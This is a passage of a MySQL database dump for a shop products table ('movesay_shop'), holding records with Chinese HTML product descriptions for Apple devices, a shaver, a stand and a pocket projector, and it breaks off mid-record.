  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '0',
  `market_price` decimal(20,2) unsigned NOT NULL COMMENT '市场价',
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`),
  KEY `deal` (`deal`),
  KEY `price` (`price`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8 COMMENT='商城商品表';

-- ----------------------------
-- Records of movesay_shop
-- ----------------------------
INSERT INTO `movesay_shop` VALUES ('1', 'Apple iPhone 6s (A1700) 64G 玫瑰金色 移动联通电信4G手机', '', '\\Upload\\shop\\563311c4f0cc5.png', 'qita', '6000.00000000', '998.00000000', '2.00000000', '<p style=\"text-align:center;\">\r\n	<img src=\"/Upload/563311bc2ce1c.jpg\" alt=\"\" /> \r\n</p>', '', '0', '1446313478', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('2', 'Apple iPhone 6s (A1700) 16G 金色 移动联通电信4G手机', '', '\\Upload\\shop\\5633138fa8737.png', 'qita', '5200.00000000', '1000.00000000', '287.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/563313883ed70.jpg\" alt=\"\" /><img src=\"/Upload/5633138dc849d.jpg\" alt=\"\" />\r\n</div>', '', '0', '1446302732', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('3', '飞科(FLYCO)FS372全身水洗电动剃须刀刮胡须刀', '', '\\Upload\\shop\\5634beeca12bc.png', 'qita', '79.00000000', '1000.00000000', '358.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/5634bfd56ab25.jpg\" alt=\"\" /><img src=\"/Upload/5634bfdd757ce.gif\" alt=\"\" /><img src=\"/Upload/5634bfe36db03.jpg\" alt=\"\" /><img src=\"/Upload/5634bfea647e3.jpg\" alt=\"\" /><img src=\"/Upload/5634bff0d59a9.jpg\" alt=\"\" /><img src=\"/Upload/5634bff7e32ad.jpg\" alt=\"\" /><img src=\"/Upload/5634bffde8fe8.jpg\" alt=\"\" />\r\n</div>', '', '0', '1446302749', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('4', 'Apple Watch Sport MJ3N2CH/A（42毫米银色铝金属表壳搭配白色运动型表带）', '', '\\Upload\\shop\\5634c0b4c7956.png', 'qita', '2900.00000000', '885.00000000', '115.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/5634c146430b7.jpg\" alt=\"\" />\r\n</div>', '', '0', '1446302815', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('5', '苹果（Apple）MacBook Pro MF839CH/A 13.3英寸宽屏笔记本电脑', '', '\\Upload\\shop\\5634c478f264c.png', 'qita', '8800.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:55px;text-align:center;\">\r\n		MacBook Pro\r\n	</p>\r\n	<p style=\"font-size:24px;text-align:center;\">\r\n		配备Retina 显示屏\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		每一像素颗粒，尽显澎湃动力。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172658167.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		绚丽夺目的 Retina 显示屏\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		领先于时代好几百万像素\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		15 英寸机型拥有超过 500 万像素，13 英寸机型拥有超过 400 万像素。因此，无论你是在润饰照片还是剪辑 HD高清家庭影片，都能获得令人震撼的清晰度。文字也锐利清晰，让浏览网页和修改文档这些日常之事都变得比以往更加赏心悦目。这样的显示屏方能配得上这款极为先进的笔记本电脑。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172704893.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		Force Touch 触控版\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		让相应式深入全新境界\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		13 英寸 MacBook Pro 带来你与 Mac 互动的全新方式。设计精巧的 Force Touch 触控板，让你无论点按表面的哪个位置，都能得到灵敏且效果一致的点击响应。在触控板下方，力度感应器能检测你的点按力度，为触控操作添加全新维度。你可以通过用力长按来启用一系列新功能，例如只需在触控板上增加按压力度，即可快速查看词语定义或预览文件。你还可以体验触觉反馈，触控板会发出触觉振动，因此你在屏幕上看到的一切，还能感觉到。所有这些先进功能，全可与深受 Mac 用户喜爱的 Multi-Touch 手势配合使用。轻轻松松间，你与 Mac 之间的沟通，迈入全新境界。仅限13英寸机型。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172711911.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		众多全新高性能技术\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		技术齐心协力，更快成就一切\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		拥有动力强劲的双核与四核 Intel 处理器、先进的图形处理器、基于 PCIe 的高速闪存、疾速内存和 Thunderbolt 2 端口，配备 Retina 显示屏的 MacBook Pro 带来全方位卓越性能，满足你对笔记本电脑的所有期待。无论你是浏览网站或构建网站，还是播放流媒体视频或剪辑视频，MacBook Pro 都能以超乎想象的动力和速度飞速处理极为复杂 (和不太复杂) 的任务。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172717994.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		纤薄、轻巧、强劲\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		毫厘之间，蕴藏无限创新\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		MacBook Pro 的设计精髓，就是在有限空间里满载强劲性能。因为我们相信，追求高性能不应该牺牲便携性。尽管全新 13 英寸 MacBook Pro 如此轻巧，却仍能提供长达 10 小时的电池使用时间，比前一代产品更长一个小时*。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172723576.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		配备一系列强大APP\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		工作事事顺手，娱乐即可上手\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		每台全新 Mac 均配备 iPhoto、iMovie、GarageBand、Pages、Numbers 和 Keynote。从开启它的那一刻起，你就可以运用照片、视频、音乐、文档、电子表格和演示文稿来尽情挥洒创意。为了配合 OS X Yosemite 的精美设计，这些 app 均已进行升级。同时，你还享有多款精彩 app，用以收发电子邮件、畅游网络、发送文本信息、进行 FaceTime 视频通话，甚至还有一款 app，可以帮你查找新的 app。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172730531.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		OS X Yosemite\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		超前的电脑操作系统\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		OS X Yosemite 使用简易、优雅美观，更经过精心打造，使得 Mac 硬件的功能得到充分发挥，堪称超前的电脑操作系统。它配备一系列出众的 app，满足你的日常所需。此外，它还让你的 Mac 和 iOS 设备能以绝佳方式默契合作。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		Retina 显示屏\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		好几百万像素的好风景\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		<br />\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		13 英寸 MacBook Pro\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:14px;\">\r\n		当你将如此多的像素纳入一个显示屏中：13 英寸机型达到 400 多万像素，15 英寸机型达到 500 多万像素，效果绝对绚丽夺目。其超高像素密度已超过人眼所能分辨的范围，使图像的逼真度提升至全新境界。13 英寸 MacBook Pro 具备惊人的 2560 x 1600 像素分辨率，而 15 英寸 MacBook Pro 拥有同样可观的 2880 x 1800 像素分辨率，可让你的高分辨率图像以像素级的精度纤毫毕现。而且文字如此锐利，让你竟有种在纸面上阅读电子邮件、网页和文档的感觉。\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		Retina 显示屏在保持非凡色彩和画质的同时，减少了眩光的出现。它的高对比度令黑色更浓郁，白色更明亮，其他一切色彩也都显得更丰富，更鲜艳。IPS 技术让你能够以 178 度的宽广视角观赏屏幕上的一切，因此你几乎可以从任何角度感受到它的与众不同。你也一定会为自己所看到的一切而着迷。\r\n	</p>\r\n	<p style=\"font-size:12px;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro 比 HDTV 多了近 200 万像素，15 英寸机型则多了 300 万像素。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		先进的 Intel 移动处理器\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		双核、四核，强大不可小视\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro，搭载第五代双核 Intel Core i5 或 Intel Core i7 处理器，可随时随地轻松满足那些对性能有较高要求的 app。这意味着，无论你带着相机去哪里，你的整个数字照片工作室将如影随行。每款机型均采用超线程技术，通过让每个内核同时处理多个任务来增强性能。快达 3.1GHz 的处理速度、高达 4MB 的共享三级缓存和高达3.4GHz 的 Turbo Boost 睿频加速技术，使这些处理器可随时应对任何任务。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		高性能图形处理器\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		荧屏表现，淋漓尽致\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro 搭载 Intel Iris Graphics 6100 图形处理器，是执行日常任务和各种图形密集型创意 app 的理想选择。你可以轻松翻阅大型照片库，畅玩那些充满精彩细节的游戏，还能连接一或两台外部显示器，这是对 13 英寸 MacBook Pro 小巧身材和超凡性能的又一次精彩诠释。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		长效电池\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		续航长达 10 小时\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		13 英寸 MacBook Pro 充电一次可运行长达 10 小时，比上一代多了一小时。而 15 英寸机型可运行长达 8小时。对任何笔记本电脑而言，这样的电池使用时间都令人赞叹。但对于配备了超高分辨率显示屏、先进处理器和图形处理器，以及超薄设计的高性能笔记本电脑而言，这绝对是超乎想象的。内置电池能为你提供多达 1000 次的完全充电和放电循环。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		更快的全闪存\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		闪存之名，并非徒有虚名\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		基于 PCle 的闪存拥有惊人的读写速度，无论你做什么，都能感受到其中的差别：启动非常快速，app 开启迅捷，甚至连桌面操作也十分流畅，响应十分迅速。13 英寸机型的闪存比前一代产品快达 2 倍，令你能在瞬间导入海量图片库。而在 15 英寸机型上，闪存与四核处理器和高性能图形处理器相结合，令 Final Cut Pro X 中要求极高的剪辑任务也能快速完成。由于这些 MacBook Pro 机型均配备了高达 1TB 的闪存，因此你可以随身携带所有的重要文件3。此外，闪存没有任何活动部件，所以超级耐用且十分安静。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		Mac 之妙\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		妙在它能帮你做到的一切\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		每台 Mac 都配备了众多激发创意和提升效率的 app。同时，还拥有一系列出色的 app 来处理各种日常事务，包括浏览网页、发送邮件和信息，以及整理你的日历。甚至还有一款 app，可以帮你查找新的 app。所以，你的 Mac 不仅功能齐备，而且全副武装。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316173058291.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:18px;\">\r\n		<br />\r\n	</p>\r\n</div>', '', '0', '1446302797', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('6', 'E能之芯 铝合金纳米微吸手机平板通用底座支架', '', '\\Upload\\shop\\5634c53ab0835.png', 'qita', '75.00000000', '100.00000000', '20.00000000', '<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181046506.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181051106.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181058295.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181105146.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181111449.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181117691.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181125633.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181133337.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181140847.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181147149.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181155338.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181203553.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181209887.jpg\" />\r\n</p>', '', '0', '1446299008', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('7', '捷视（JS）A1 商务家用手持高清无线微型投影仪', '', '\\Upload\\shop\\5634c6655eb61.png', 'qita', '1900.00000000', '100.00000000', '20.00000000', '<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		捷视 A1无线微型投影仪\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		全球首款基于DLP技术，LED光源技术微型投影仪\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		A1是全球首款基于DLP技术，0.3英寸DMD芯片全功能自解码（最高支持1080P分辨率视频）LED光源技术微型投影仪，内置无线通讯互联技术模块，同各种数码产品相连接，无需外接繁琐的数据线及电源线，不受空间，地域环境限制。LED微型投影仪，又称口袋式投影机、便携式投影机、是把传统庞大的投影机精巧化、便携化、微小化，娱乐化、实用化、使投影更加贴近生活和娱乐。由于采用国际一流（OSRAM，欧司朗半导体公司）LED光源技术，鉴于LED的超强使用寿命，该机平均使用寿命超过3万小时。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165527528.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		小投影，大画面\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		工作、娱乐一机到位，随时随地与他人分享\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		业界首款内置无线高速Wi-Fi模块及1080P高清解码芯片，可解读及传输九城以上视频片源，让你的网络视频无处不在，小投影，大画面，随时随地同他人分享视频、图片等资源，采用直读TF卡或者机器内存的OFFICE文档，处理文档更加方便快捷。A1无线微型投影仪适用于移动商务（尤其是：IT、咨询、顾问、金融、保险、直销等行业）、产品展示，播放OFFICE文档，数码产品影视分享，电玩游戏、小型会议及教学、户外娱乐活动、PARTY等，儿童教育及娱乐。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165536856.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		内置无线通讯模块\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		手机遥控器，有线无线连接电脑，一步到位\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		支持手机遥控器，手机可当做是遥控器来操控投影。连接电脑，可有线、无线连接电脑。该产品不仅可以通过只读取TF卡或机器内存功能，还可以通过内置无线通讯模块同智能手机无线连接，将手机屏幕显示内容无线传输到投影仪，并投射出来，支持安卓同苹果系统手机，同时支持该系统的 iPad、PC等，并能够有线无线连接笔记本或台式电脑并同时镜像屏幕内容。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165543271.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		全球首款人性化的操作界面\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		易读、易懂、易操作\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		全球首款人性化的操作界面，易读易懂，与同类产品相比，首次接触该产品的使用者，能在更短的时间内掌握大部分功能操作，让使用者能以愉快的心情去欣赏所喜爱的视频画面中。手持投影产品中，这款亮度适中，画面对比度1000：1，854x480高分辨率，色彩艳丽通透，还原性好，图像清晰、锐利，播放文档等文字清晰高，细节良好。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165550219.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165559914.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:10px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:20px;\">\r\n		与其他同类产品相比，具有如下特点及优点:\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		● 业界同功能的整机中体积最小，重量最轻，携带性更好。<br />\r\n● 能通过有线无线连接windows系统，苹果系统产品，安卓系统产品等。<br />\r\n● 同距离投影时，画面面积要比同类产品大10英寸左右，画面直观看起来更加舒服，流畅。<br />\r\n● 机器内置无线通讯模块，数据处理与接收稳定，不受外界环境因素，搬动，震动等造成无线通讯信号中断或者影响播放流畅度，整机批量供货时良品高。<br />\r\n● 由于使用的是聚合物锂电池，安全性要高于市场上同类机型所用电池，续航能力及使用寿命高于普通锂电池。<br />\r\n● 优化散热设计风道，噪音低，整机开孔率少，吸附灰尘几率小，外观工艺处理更好，整机故障返修率低。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416171738581.jpg\" />\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416171753458.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165629394.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165636135.jpg\" />\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		1、是否所有的手机都能与该微型投影仪无线连接？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：目前支持的手机操作系统为安卓4.0版本以上，苹果系统版本为5.1（含该版本）才能使用，暂不支持windowsphone系列操作系统手机。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		2、画面最大可以投影多大面积？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：40英寸左右/1米，在较暗的房间里投射面积更大，最大80英寸，视 环境及投射内容来决定投影面积大小。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		3、机器内部有自带内存吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：机器除去可以外接TF卡（最高支持32G）外，内部自带4G内存，可以存储用户想要存储的内容。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		4、可以遥控吗，为何没有遥控器？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：该产品的设计理念为手持产品，机器表面按键基本能满足遥控的功能，不是桌面大型投影，按键功能操作起来更方便，不存在遥控死角，携带方便 。其次我们设计的同智能手机可以无线通讯的，利用手机同无线Wi-fi连接，可以实现网上内容海量传输，同时手机也可以安装EZCONTROL这个APP软件，通过这个软件来操作投影整个功能。大部分遥控功能手机可以取代，通过手机触控操作更加方便。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		5、可以外接音箱吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：可以外接多媒体或者其他有线有源音箱。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		6、可以用移动电源对机器供电吗？选用怎样的移动电源供电？一般的移动电源可以用多长时间？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：可以使用，根据我们外接的供充电适配器供电参数，选用的移动电源是5V/2A的，使用Micro usb的插头即可，使用时间要看投影播放的内容及移动电源的电池容量。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		7、整机的使用寿命能用多久，售后怎样保证？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：整机使用的全球一流的LED光源技术，上面栏目已经提到，正常使用寿命是3万小时以上，按照每天使用8小时计算，8小时X365=2920小时，整机最低可以使用8年以上，微型投影结构设计难度在于散热及风道设计合理，本机不同于市场上某些产品，开孔率高，风道设计分散，容易吸进灰尘，造成机器电路板损坏及散热风扇停转；其次市场上某些机器由于散热设计不合理，发热量高，机器在工作的时候，明显感觉到机身发热，甚至超过使用者的耐热温度，给使用者不好的体验感。本机整机噪音亦低于同类产品，不会在你使用的时候听到恼人的噪音；本机已通过国家3C认证，安全性及品质有保证，不用担心使用安全及售后服务。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		8、亮度会衰减吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：使用3到5年以后，可能亮度衰减总体15%，电子产品本身是消耗品，长期使用后，亮度衰减是属于正常情况，但是整机不会停止工作，在投射画面亮度上略显偏低。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		9、这个投影仪为什么没有幕布？直接投在白色墙上效果会受影响吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答: 这个是便携式投影仪，设计思想是随时随地投影，所以没有必要配投影幕，投射到墙壁上是可以的，白色无污点的墙壁即可，投影效果没有影响。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		10、为什么机器在使用中，感觉机身有些热量？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：投影机内部光源在工作时会产生热量，通过内部的风路将热量散出，热量在行进过程中，部分会通过机器外壳，所以会感觉到机器外壳有些热量，属于正常现象，不会影响使用。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		11、使用注意重点事项？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：严禁进、出空气口被异物阻档，或者机身被其他物体覆盖，导致机器工作时产生的热量将不能及时有效排出，造成机身发热明显，损坏整机；严禁在风沙环境中或者强酸强碱环境中使用；严禁机器进水等其他液体，以免损坏整机。\r\n	</p>\r\n</div>', '', '0', '1446299237', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('8', '苹果（Apple）iPad Air 2 9.7英寸平板电脑 16G WiFi版', '', '\\Upload\\shop\\5634c7010367b.png', 'qita', '3400.00000000', '100.00000000', '20.00000000', '<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:45px;text-align:center;\">\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:45px;text-align:center;\">\r\n	iPad Air 2\r\n</p>\r\n<p style=\"font-size:35px;text-align:center;\">\r\n	轻轻地，改变一切。\r\n</p>\r\n<p style=\"text-align:center;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154812638.jpg\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:30px;text-align:center;\">\r\n	多才多能，让你不想放手；<br />\r\n<br />\r\n又轻又薄，让你不觉在手。\r\n</p>\r\n<p style=\"font-size:14px;text-align:center;\">\r\n	对于 iPad，我们一直都有一个看似自相矛盾的目标：要创造一部功能极为强大，但又轻盈纤薄到你不觉在手的设备；一部让你能全力挥洒，但却毫不费力的设备。 iPad Air 2 不仅实现了这一切，甚至还超出了我们的预期。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<div style=\"color:#333333;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:35px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"color:#333333;background-color:#FFFFFF;margin:0px 